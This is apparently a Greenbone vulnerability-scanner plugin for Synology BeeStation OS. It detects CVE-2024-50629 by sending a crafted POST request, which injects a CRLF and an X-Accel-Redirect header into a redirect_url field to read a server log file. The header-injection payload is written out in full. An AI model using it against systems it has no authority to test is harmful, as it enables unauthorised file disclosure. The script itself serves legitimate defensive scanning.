# SPDX-FileCopyrightText: 2025 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/o:synology:beestation_os";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.156061");
  script_version("2025-12-19T05:45:49+0000");
  script_tag(name:"last_modification", value:"2025-12-19 05:45:49 +0000 (Fri, 19 Dec 2025)");
  script_tag(name:"creation_date", value:"2025-12-18 09:44:30 +0000 (Thu, 18 Dec 2025)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2025-03-19 02:15:27 +0000 (Wed, 19 Mar 2025)");

  script_cve_id("CVE-2024-10441", "CVE-2024-10445", "CVE-2024-50629");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Synology BeeStation (BSM) Multiple Vulnerabilities (Synology-SA-24:23) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2025 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_synology_bsm_http_detect.nasl");
  script_mandatory_keys("synology/beestation/http/detected");
  script_require_ports("Services/www", 6600);

  script_tag(name:"summary", value:"Synology BeeStation (BSM) is prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.

  Note: This script checks for the presence of CVE-2024-50629 which indicates that the system is
  also affected by the other included CVEs.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2024-10441: Improper encoding or escaping of output in the system plugin daemon allowing
  remote attackers to execute arbitrary code

  - CVE-2024-10445: Improper certificate validation in the update functionality allowing remote
  attackers to write limited files

  - CVE-2024-50629: Improper encoding or escaping of output in the webapi component allowing remote
  attackers to read limited files");

  script_tag(name:"affected", value:"Synology BeeStation (BSM) version 1.x prior to 1.1-65374.");

  script_tag(name:"solution", value:"Update to version 1.1-65374 or later.");

  script_xref(name:"URL", value:"https://www.synology.com/en-global/security/advisory/Synology_SA_24_23");
  script_xref(name:"URL", value:"https://www.zerodayinitiative.com/advisories/ZDI-25-214/");
  script_xref(name:"URL", value:"https://www.zerodayinitiative.com/advisories/ZDI-25-211/");
  script_xref(name:"URL", value:"https://www.zerodayinitiative.com/advisories/ZDI-25-269/");
  script_xref(name:"URL", value:"https://kiddo-pwn.github.io/blog/2025-11-30/writing-sync-popping-cron");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/webapi/entry.cgi";

data = "api=SYNO.API.Auth.RedirectURI&version=1&method=run&session=finder&redirect_url=" +
       'https://dsfinder.synology.com/dsm/login?\r\nX-Accel-Redirect:/volume1/@synologydrive/log/cloud-workerd.log';

req = http_post_put_req(port: port, url: url, data: data);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && (
    # e.g.:
    # 2024-03-16T10:56:29 (25415:22624) [INFO] job-queue-client.cpp.o(103): JobQueueClient Setup started.
    "checkpoint-task.cpp.o" >< res ||
    "job-queue-client.cpp.o" >< res ||
    egrep(string: res, pattern: "^[0-9A-Z:-]+ \([0-9]+:[0-9]+\) \[INFO\].+\.(o|cpp)", icase:FALSE))
   ) {
  body = http_extract_body_from_response(data: res);

  info["HTTP Method"] = "POST";
  info["Affected URL"] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
  info['HTTP "POST" body'] = data;

  report  = 'By doing the following HTTP request:\n\n';
  report += text_format_table(array: info) + '\n\n';
  report += "it was possible to read the file 'synologydrive/log/cloud-workerd.log'.";
  report += '\n\nResult (truncated):\n' + substr(body, 0, 3000);
  expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;

  security_message(port: port, data: report, expert_info: expert_info);
  exit(0);
}

exit(99);
